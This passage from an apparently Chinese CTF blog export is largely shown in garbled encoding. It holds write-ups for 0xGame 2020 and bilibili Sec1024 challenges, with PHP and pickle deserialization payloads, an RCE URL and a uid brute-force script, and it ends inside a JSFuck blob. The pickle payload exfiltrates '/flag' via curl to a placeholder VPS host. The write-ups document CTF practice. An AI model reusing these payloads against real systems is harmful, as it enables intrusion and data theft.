username=|O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";} password=admin motto=ddd session æ–‡ä»¶ä¸­çš„å†…å®¹å¦‚ä¸‹ã€‚ è®¿é—® profile é¡µé¢æ—¶æˆåŠŸæŠŠ admin ç½®ä¸º1ï¼Œè·å–äº† flag.php é¡µé¢å†…å®¹ã€‚ å†æ‹¿å»è¿œç¨‹è·‘ã€‚ å¾—åˆ° flagã€‚ References &amp; Extensive Reading: PHPä¸­çš„ini_set()å‡½æ•°ä»‹ç» PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶ PHPååºåˆ—åŒ–æ¼æ´ Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ¼æ´ï¼ˆini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);ï¼‰ ä¸Šé¢æœ‰æ–‡ç« è¿˜ä»‹ç»äº†å¦ä¸€ç§æ¼æ´ã€‚ è‹¥ session.upload_progress.enabled ä¸º Onï¼Œå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ INI ä¸­è®¾ç½®çš„ session.upload_progress.name åŒåå˜é‡æ—¶ï¼Œå½“ PHP æ£€æµ‹åˆ°è¿™ç§ POST è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨ $_SESSION ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œå³å°±å¯ä»¥å°† filename çš„å€¼èµ‹å€¼åˆ° session ä¸­ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ Session Upload Progress æ¥è®¾ç½® sessionã€‚ ä¾‹å¦‚ http://web.jarvisoj.com:32784/index.php è¿™ä¸€é¢˜ã€‚ é€šè¿‡æ„é€ ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œå¦‚ &lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123aaa\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; HTTP å¦‚ä¸‹ï¼Œæ³¨æ„è¦å¸¦ä¸Š Cookieã€‚ POST /index.php HTTP/1.1 Host: web.jarvisoj.com:32784 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=jnmfjqfll0kttv9cf6i7dfhh32 Content-Type: multipart/form-data; boundary=---------------------------395747469534482322661051838442 Content-Length: 436 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------395747469534482322661051838442 Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\" 123asdaf -----------------------------395747469534482322661051838442 Content-Disposition: form-data; name=\"file\"; filename=\"|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";}\" Content-Type: text/plain xxxxx -----------------------------395747469534482322661051838442-- è¡¨å•é‡Œå¸¦ä¸Š PHP_SESSION_UPLOAD_PROGRESSï¼Œå†ä¿®æ”¹ filename å°±èƒ½å† session åŠ è½½æ—¶åˆ©ç”¨ååºåˆ—åŒ–æŠŠå†…å®¹åŠ è½½åˆ° SESSION ä¸­ã€‚ å†åˆ©ç”¨ file_get_contents ç»“åˆå½“å‰è·¯å¾„è¯»å–æ–‡ä»¶å³å¯ã€‚ print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); Web_JWThttp://web.game.0xctf.com:30107/ éšæ„è¾“å…¥ç”¨æˆ·åå¯†ç å»ç™»å½•ï¼Œæ ¹æ®è¿”å›çš„ cookie å¾—åˆ° JWT (JSON Web Token)ã€‚ å‚è€ƒä¹‹å‰çš„ NUAACTF web2-jwtï¼Œåˆ©ç”¨ c-jwt-cracker è·‘å‡º secretã€‚ secret å³ njuptã€‚ æ‹¿å» jwt.io åŠ å¯†ä¸€ä¸‹å°±å¥½äº†ï¼Œç„¶åæ”¹æ‰ payload é‡Œçš„ role ä¸º adminã€‚ æœ€åæŠŠ cookie æ”¹æˆ Encoded é‡Œçš„é‚£ä¸ªå°±å®Œäº‹äº†ã€‚ Web_easyPython äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨Python ç™»å½•admin ç™»å½•æˆåŠŸä¸å¦ä¸æ˜¯å¿…è¦çš„ï¼Œé‡è¦åœ¨è¿‡ç¨‹ï¼Œä»”ç»†çœ‹çœ‹bak é¢˜ç›®åœ°å€ é¦–å…ˆç‚¹å‡» Tips æ‹¿åˆ°é¢˜ç›®çš„æºä»£ç ã€‚ å…³é”®ä»£ç ï¼š # home page @app.route('/') # @login_required def index(): usercookies = request.cookies.get('Cookies') if not usercookies: usercookies = \"{'username':'guest'}\" else: usercookies = pickle.loads(base64.b64decode(usercookies)) resp = make_response(render_template('index.html')) resp.set_cookie('Cookies', base64.b64encode(pickle.dumps(usercookies))) return resp è¿™é‡Œå¾ˆæ˜æ˜¾çœ‹åˆ°äº†pickleï¼Œè€Œä¸”æ ¹æ®æç¤ºä¸ç™»é™†ä¸å¦æ— å…³ï¼Œé‚£å°±æ˜¯è¿™é‡Œäº†ã€‚ è¿™é‡Œ pickle.loads ååºåˆ—åŒ–æ—¶è²Œä¼¼æ²¡æœ‰è¿‡æ»¤ï¼Œäºæ˜¯å¯ä»¥ä¼ ä¸€ä¸ª object è¿‡å»ï¼Œåœ¨å®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨ __reduce()__ æ–¹æ³•ï¼Œæ‰§è¡Œè¿™é‡Œé¢çš„å†…å®¹ã€‚ import pickle import base64 import pickletools import os class User(): def __init__(self): self.name = 'miaotony' def __reduce__(self): return (os.system, ('curl http://VPS:PORT/`cat /flag | base64`',)) payload = pickle.dumps(User()) payload = pickletools.optimize(payload) print(payload) pickletools.dis(payload) payload_64 = base64.b64encode(payload) print(payload_64) æŠŠè¿™ä¸ªç”Ÿæˆçš„ base64 ç¼–ç çš„ payload ä½œä¸º Cookiesï¼Œä¿®æ”¹åé‡æ–°è®¿é—®ï¼Œç†è®ºä¸Šå°±èƒ½åœ¨ VPS ä¸Šæ‹¿åˆ° base64 ç¼–ç çš„ flagã€‚ ç„¶è€Œå¹¶æ²¡æœ‰æˆåŠŸã€‚ã€‚æ‰“è¿‡å»ä¹‹åè¿”å› 500 Internal Server Error. æ¯”èµ›ç»“æŸä¹‹åçœ‹äº†å®˜æ–¹WPï¼Œæ‰çŸ¥é“åŸæ¥æ˜¯æ“ä½œç³»ç»Ÿçš„é”…ï¼Œæˆ‘è¿™ä¸ªæ˜¯åœ¨ Windows ä¸‹ç”Ÿæˆçš„ã€‚ è¿™ä¸ªåºåˆ—åŒ–çš„ç»“æœè¿˜ä¸æ“ä½œç³»ç»Ÿæœ‰å…³ç³»ã€‚ ä¿®æ”¹ä¸º posixï¼Œæˆ–è€…åœ¨ Linux ä¸‹ç”Ÿæˆå°±æ²¡è¿™ä¸ªé—®é¢˜äº†ã€‚ å¦å¤–å‘ç°éœ€è¦å»æ‰ pickle çš„ç‰ˆæœ¬æ ‡è¯† \\x80\\x03.æˆ‘ç”¨çš„ opcode æ˜¯ Python3 ä¸‹çš„ ç‰ˆæœ¬3ã€‚ äºæ˜¯æˆ‘è¿™ä¸ª payload å°±æ˜¯ b'cposix\\nsystem\\nX3\\x00\\x00\\x00curl http://VPS:PORT/`cat /flag | base64`\\x85R.' ä¿®æ”¹ Cookiesï¼Œåœ¨ VPS ä¸Šæ¥æ”¶ä¸€ä¸‹ï¼Œæ‹¿åˆ° flagã€‚ Misc_flippwd.mp3 ä¸€å¬å°±æ˜¯ç”µæŠ¥äº†ï¼Œè€æ‘©æ–¯äº†ã€‚ è¯»å‡ºæ¥æ˜¯ ....- ----- ----- ---.. ..... -.... -.... ----. ----. ...-- ----- ----- ... .. -.. .-. --- .-- ... ... .- .--. è§£ç å¾—åˆ° 400856699300SIDROWSSAP ä¸€çœ‹å°±æ˜¯å€’è¿‡æ¥äº†çš„ï¼Œé‚£å°±å€’å›å»ã€‚ PASSWORDIS003996658004 æ‹¿ 003996658004 å»è§£å‹ galf_si_siht_2.zipï¼Œå¾—åˆ° galf_si_siht.zipã€‚ å‘ç°æ‰“ä¸å¼€ï¼Œæ”¾åˆ° 010 Editor é‡Œï¼Œå‘ç°å¥—äº†ä¸¤ä¸ª zipï¼Œè€ç¼åˆæ€ªäº†ã€‚ åˆ†åˆ«æŠŠä¸¤ä¸ª zip æå–å‡ºæ¥ã€‚ password.txt: I want to write file in binary, but something seems to be wrong? çœ‹åˆ°æœ«å°¾ä¸€ä½éƒ½æ˜¯0ï¼Œç›²çŒœæ˜¯å€’è¿‡æ¥çš„ ASCIIã€‚å†™ä¸ªè„šæœ¬è¯•è¯•ã€‚ s = \"\"\"10100110 11010110 ...... 10011010\"\"\" l = s.split('\\n') pwd='' for i in l: x = i[::-1] print(x) char = chr(int(x, 2)) pwd += char print(pwd) print(pwd[::-1]) # You are so clever that this problem is just a piece of cake for you, the password is A_pi3ce_0f_C4ke å¾—åˆ°å¯†ç ä¸º A_pi3ce_0f_C4keã€‚ è§£å‹galf_si_siht.pngã€‚ å¥½å®¶ä¼™ï¼Œåˆæ˜¯å€’è¿‡æ¥çš„ã€‚ with open(r\"galf_si_siht.png\", 'rb') as fin: img = fin.read() with open(r\"galf_si_siht_fix.png\", 'wb') as fout: fout.write(img[::-1]) å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚ æ‰«ç å¾—åˆ° http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php 0xGame{b07906f9-f6f5-4120-9f80-01d761c8602e} è€å¥—å¨ƒäº†ï¼ˆ Misc_Hexé…±å‘ç°è¿‡æ»¤çš„å…³é”®å­—å…¶å®åªæ˜¯å‘½ä»¤é‡ŒåŒ…å«ç›¸åº”çš„å­—ç¬¦è€Œå·²ï¼Œå¤§å†™ç»•è¿‡å°±å®Œäº‹äº†~ ä¸è¿‡è¿˜æ˜¯æ—¥äº†ä¸€ä¸ªæ™šä¸Šï¼ˆï¼ˆ ä¹‹å‰è¿˜æ²¡æ€ä¹ˆåœ¨ Windows ä¸‹æ•´å‘½ä»¤è¡Œï¼Œè¿™æ¬¡è¿˜ç‰¹åœ°å»æŸ¥äº†ä¸€ç•ªã€‚ æœ€å¼€å§‹è¿˜æ˜¯ç»•äº†ä¸€å¤§å¼¯ï¼Œæœ¬æ¥ä¸çŸ¥é“ flag åœ¨å“ªï¼Œæ‰¾äº†åŠå¤©çªç„¶æƒ³åˆ°åº”è¯¥å°±åœ¨æ¡Œé¢ä¸Šäº†ã€‚ å½“å‰è·¯å¾„æ˜¯ C:\\Users\\Administrator\\Desktop\\Game\\HexQBot é€šè¿‡ç¯å¢ƒå˜é‡å’Œé€šé…ç¬¦ï¼Œå¤åˆ¶å†è¯»å– flagã€‚ åæ¥çªç„¶æƒ³åˆ°ä¸ç”¨è¿™ä¹ˆå¤æ‚ï¼Œç›´æ¥è¯»å°±å®Œäº‹äº†ã€‚ åé¢é—®äº†å‡ºé¢˜çš„ Am473ur å¸ˆå‚…ï¼Œè¿™ä¸ªè¿”å›å†…å®¹çš„é•¿åº¦æœ‰äº†é™åˆ¶ï¼Œæ‰€ä»¥æœ‰çš„æŒ‡ä»¤å‘è¿‡å»æ²¡æœ‰è¿”å›äº†ã€‚ å¦å¤–è¿™ä¸ª Hexé…± æŒºå®¹æ˜“å´©çš„ï¼Œå¿ƒç–¼ä¸€ä¸‹è¿ç»´å¸ˆå‚…ï¼ˆ Week 3ä¹‹å‰å‡ å‘¨æ‡’äº†ï¼Œå°±éšä¾¿çœ‹çœ‹é¢˜åšåšé¢˜ï¼ŒåŸºæœ¬æ²¡å†™ WPï¼Œå°±è¿™æ ·8. Web_intvalpayload: http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3 &lt;?php highlight_file(__FILE__); include(\"ffllaagg.php\"); //1st if(isset ($_GET['0xGame'])) { if($_GET['0xGame'] !== '20201001' &amp;&amp; preg_match('/^20201001$/',$_GET['0xGame'])) echo 'Good job!'.'&lt;br&gt;'; else die('Think it over!'); } //2nd if(isset($_GET['id'])){ $id=intval($_GET['id']); if($_GET['id'] != 1024 &amp;&amp; $id === 1024) echo 'Congratulations!'.'&lt;br&gt;'.$flag; else die('Work harder!'); } Good job! Congratulations! 0xGame{947eae96fe415cbc6eab176f15dd98b1} Web_edræ·±ä¿¡æœ RCE å‚è€ƒï¼š https://blog.csdn.net/qq_37602797/article/details/108068122 https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ payload: http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag 0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y} å°ç»“è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ ï¼ˆé¦–å°¾å‘¼åº” ï¼ˆæºœäº†å–µ","path":"2020/11/05/CTF_2020_0xGame/"},{"title":"CTF | 2020 bilibili Sec1024 WriteUp","text":"å‰è¨€ Bilibili å°ç ´ç«™æ•´äº†ä¸ª Sec1024ï¼Œ1024 å‡Œæ™¨çœ‹ç¾¤é‡Œæœ‰å¸ˆå‚…æåˆ°å°±æ¥çœ‹äº†ä¸€çœ¼ã€‚ ç»“æœè¢«å¡ä½äº†åšä¸ä¸‹å»ï¼Œäºæ˜¯åˆçœ‹äº†ä¸€ä¸‹åˆã€‚ã€‚ 2020-1024=996 æ‰€ä»¥å¤§å®¶éƒ½åŠ ç­äº†å”‰ï¼Ÿ å±å®æ¶å¿ƒäººï¼ˆ éšæ„å†™ä¸ª Write Up å¥½äº†ã€‚ P.S.: æŒ‰é“ç†ï¼Œæ¯”èµ›æœªç»“æŸä¸åº”è¯¥å‘å‡ºæ¥çš„ï¼Œä¸è¿‡ç®—äº†8ï¼Œç°åœ¨ä¸€æœåˆ°å¤„éƒ½æ˜¯ flag äº†ï¼Œå¼€å¿ƒå°±å¥½ã€‚ 0x01é¡µé¢çš„èƒŒåæ˜¯ä»€ä¹ˆï¼Ÿ http://45.113.201.36/index.html ä¸€çœ‹åˆ°å°±ä»¥ä¸ºæ˜¯æ”¹ UAï¼Œè°çŸ¥é“å…¶å®æ˜¯ç¬¬äºŒé¢˜çš„ç­”æ¡ˆ2333. ç¬¬ä¸€é¢˜åœ¨è¿™é‡Œ å…¶å®æ˜¯è°ƒç”¨äº† http://45.113.201.36/api/admin è¿™ä¸ªæ¥å£ã€‚ 0x02çœŸæ­£çš„ç§˜å¯†åªæœ‰ç‰¹æ®Šçš„è®¾å¤‡æ‰èƒ½çœ‹åˆ° æ”¹ UA å³å¯ã€‚ http://45.113.201.36/api/ctf/2 0x03å¯†ç æ˜¯å•¥ï¼Ÿ http://45.113.201.36/login.html æœ¬æ¥ä»¥ä¸ºæ˜¯ sql æ³¨å…¥ï¼Œä½†è¯•äº†å‘ç°ä¸å¯¹åŠ²ï¼Œæ€ä¹ˆéƒ½æ³¨ä¸è¿›å»ã€‚ç›²æ³¨çš„è¯ä¹Ÿæ²¡æœ‰æ‰€éœ€è¦çš„è¿”å›ä¿¡æ¯ã€‚ æœ€ååº”è¯¥åªæœ‰å¼±å¯†ç äº†ã€‚ è·‘äº†ä¸€å †å­—å…¸éƒ½ä¸è¡Œï¼Œæœ€åçªç„¶ä¸€æƒ³ï¼Œæ‰‹è¾“äº†ä¸ª bilibili å‡ºæ¥äº†ã€‚ ï¼ˆæ‘Šæ‰‹ï¼Œå°±ç¦»è°± 0x04å¯¹ä¸èµ·ï¼Œæƒé™ä¸è¶³ï½ http://45.113.201.36/ superadmin.html $.ajax({ url: \"api/ctf/4\", type: \"get\", success:function (data) { console.log(data); if (data.code == 200){ // å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬ $('#flag').html(\"æ¬¢è¿è¶…çº§ç®¡ç†å‘˜ç™»é™†ï½ç­”æ¡ˆæ˜¯ : {{ \" + data.data + \" }}\".toLowerCase() ) } else { // å¦‚æœæ²¡å€¼ $('#flag').html(\"æœ‰äº›ç§˜å¯†åªæœ‰è¶…çº§ç®¡ç†å‘˜æ‰èƒ½çœ‹è§å“¦~\") } } }) å‘ç°è¯·æ±‚è¿™ä¸ª API ä¼šè¿”å›ä¸€ä¸ªåä¸º role çš„ cookieï¼Œé‡Œé¢å†…å®¹æ­£å¥½32ä½ï¼Œè€ƒè™‘å°±æ˜¯ md5 äº†ã€‚ ee11cbb19052e40b07aac0ca060c23ee è§£å¯†å‘ç°è¿™ä¸ªæ˜¯ userã€‚ æ—¢ç„¶è¯´è¦è¶…çº§ç®¡ç†å‘˜ï¼Œ é‚£åº”è¯¥å°±æ˜¯æ”¹è¿™ä¸ªäº†ã€‚ è¯•äº† superadmin, admin, root, administrator, superuser, bilibili, â€¦ éƒ½ä¸å¯¹ã€‚ æœ€åå‘ç°æ˜¯ Administratorã€‚è¿™ä¸æ˜¯è„‘ç­‹æ€¥è½¬å¼¯å˜›ï¼Ÿï¼Ÿï¼Ÿ md5 â€“&gt; 7b7bc2512ee1fedcd76bdc68926d4f7b å“¦å¯¹äº†ï¼Œcookie è¦å¸¦ä¸Š sessionï¼Œé‡Œé¢è®°å½•äº†ç”¨æˆ·ç™»å½•ä¿¡æ¯ï¼Œå¦åˆ™ä¼šæç¤º è¯·å…ˆç™»å½•ã€‚ 0x05åˆ«äººçš„ç§˜å¯† http://45.113.201.36/user.html $(function () { (function ($) { $.getUrlParam = function(name) { var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\"); var r = window.location.search.substr(1).match(reg); if (r != null) return unescape(r[2]); return null; } })(jQuery); var uid = $.getUrlParam('uid'); if (uid == null) { uid = 100336889; } $.ajax({ url: \"api/ctf/5?uid=\" + uid, type: \"get\", success:function (data) { console.log(data); if (data.code == 200){ // å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬ $('#flag').html(\"æ¬¢è¿è¶…çº§ç®¡ç†å‘˜ç™»é™†ï½flag : \" + data.data ) } else { // å¦‚æœæ²¡å€¼ $('#flag').html(\"è¿™é‡Œæ²¡æœ‰ä½ æƒ³è¦çš„ç­”æ¡ˆï½\") } } }) }); åœ¨æ‰€ç»™çš„ uid 100336889 é™„è¿‘çˆ†ç ´ã€‚ import requests import json import time x = 100336889 headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36', 'Accept-Language': 'en-US,en;q=0.5', 'Cookie': 'session=xxxxxxxxxxxxxxxxxxx' } for uid in range(x-1500, x+1500): try: print(uid) url = f'http://45.113.201.36/api/ctf/5?uid={str(uid)}' r = requests.get(url, headers=headers) r.encoding = 'utf-8' r_json = r.json() print(r_json) if r_json.get('code') == 200: print('!!!!!!!!!!!!') print(r_json) break except Exception as e: print(e) print(uid) time.sleep(1) uid = uid-1 æœ€åå‘ç° uid æ˜¯ 100336917ï¼Œåç§»é‡å°± 28â€¦ 6d917dff-eb085a50-58b6513f-5c0c3248 æˆ–è€… Burp Suite ä¹Ÿè¡Œã€‚ 0x06ç»“æŸäº¦æ˜¯å¼€å§‹ http://45.113.201.36/blog/single.php?id=1 æ˜¯ä¸ªå¥‡æ€ªçš„åšå®¢é¡µé¢ã€‚ ä¸Šé¢ä¸€è¡Œå¯¼èˆªæ éƒ½ 404ï¼Œæ„Ÿè§‰ä¸Šåº”è¯¥æ˜¯ id å‚æ•°çš„æ³¨å…¥ï¼Ÿ æ²¡ææ‡‚ï¼ˆ 0x07æ¥ä¸‹æ¥çš„æ—…ç¨‹ï¼Œéœ€è¦å°‘å¹´è‡ªå·±å»æ¢ç´¢å•¦ï½ ï¼ˆç›²çŒœå°±ç¦»è°± æœªçŸ¥ã€‚ 0x086379 Redis ç«¯å£ redis-cli.exe -h 45.113.201.36 45.113.201.36:6379&gt; get flag8 \"d436b982-2b81aa54-49a8d2db-87ab951a\" ä»¥åŠï¼Œè¢«æ… shi äº†ï¼Ÿ 0x09æœªçŸ¥ã€‚ 0x0Aè·¯å¾„ç›²çŒœï¼ˆå°±ç‹‚æ‰«å‘— http://45.113.201.36/blog/test.php [][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+